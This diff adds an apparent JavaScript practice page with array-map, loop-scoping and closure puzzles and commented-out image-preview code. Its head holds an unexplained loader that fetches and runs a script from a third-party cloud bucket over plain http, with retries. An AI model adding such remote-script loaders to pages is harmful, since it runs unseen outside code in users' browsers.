@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>js</title>
+    <script>
+        ! function () {
+            window._error_storage_ = [], window.addEventListener && window.addEventListener("error", function () {
+                window._error_storage_ && window._error_storage_.push([].slice.call(arguments))
+            }, !0);
+            var e = 3;
+            setTimeout(function n() {
+                var r = document.createElement("script");
+                r.async = !0, r.src = "http://oys4ga3zg.bkt.clouddn.com/timing.js", r.crossOrigin = "anonymous", r.onerror = function () {
+                    --e > 0 && setTimeout(n, 1500)
+                }, document.head && document.head.appendChild(r)
+            }, 1500)
+        }();
+    </script>
+</head>
+<body>
+    <div id="container">
+        <input type="file" class="file-reader" onchange = "showPreview(this)" >
+        <img src="" alt="" class="preview">
+    </div>
+
+    <script>
+        
+        let arr = ['1', '2', '3']
+        arr.map( (con, i) => {
+            console.log(parseInt(con))
+        })
+    //     console.log(Math.random()*8 | 0)
+    //     console.log(arr.map(parseInt))
+
+    //     //随机设置头像的地址  
+    //     let touXiang = function (url) {  
+    //         let _url = url || (Math.random()*8 | 0);  
+    //         switch (_url) {  
+    //             case 0 :  
+    //                 return "icon-river__easyiconnet1";  
+    //             case 1 :  
+    //                 return "icon-river__easyiconnet";  
+    //             case 2 :  
+    //                 return "icon-photo_camera__easyiconnet";  
+    //             case 3 :  
+    //                 return "icon-planet_earth__easyiconnet";  
+    //             case 4 :  
+    //                 return "icon-palace__easyiconnet";  
+    //             case 5 :  
+    //                 return "icon-mountain__easyiconnet";  
+    //             case 6 :  
+    //                 return "icon-parachute__easyiconnet";  
+    //             case 7 :  
+    //                 return "icon-map__easyiconnet";  
+    //             case 8 :  
+    //                 return "icon-mountains__easyiconnet";  
+    //             case -1 :  
+    //                 return "icon-yonghu"  
+    //         }  
+    //     };  
+
+    //    console.log(touXiang(3))
+
+    //    for (var i = 1; i <= 3; i++) {
+    //         setTimeout(function(){
+    //             console.log(i);
+    //         }, 0);
+    //     };
+
+    //     for(let i = 0; i <= 3; i++) {
+    //         setTimeout(function() {
+    //             console.log(i)
+    //         }, 0)
+    //     }
+
+        
+    //    let formData = new FormData()
+    //    console.log(formData)
+        
+    //     const fileReader = document.querySelector('.file-reader')
+    //     const previewImgOne = document.querySelector('.preview')
+    //     function showPreview(source) {  
+    //         let file = source.files[0];  
+    //         //限定上传文件的类型，判断是否是图片类型
+            
+
+    //         if (window.FileReader) {  
+    //             let fr = new FileReader();  
+    //             fr.onloadend = function(e) {  
+    //                 previewImgOne.src = e.target.result;  
+    //             };  
+    //             // fr.readAsDataURL(file);
+    //             if (file){
+    //                 fr.readAsDataURL(file)
+    //             }  else{
+    //                 previewImgOne.src = ""
+    //             }
+    //         }  
+            
+    //     } 
+        
+
+        function fun(n, o) {
+            console.log(o)
+
+            return {
+                fun: function(m) {
+                    return fun(m, n)
+                }
+            }
+        }
+
+        let a = fun(0); a.fun(1); a.fun(2); a.fun(3);
+        let b = fun(0).fun(1).fun(2).fun(3)
+        let c = fun(0).fun(1); c.fun(2); c.fun(3)
+
+    </script>
+</body>
+</html>
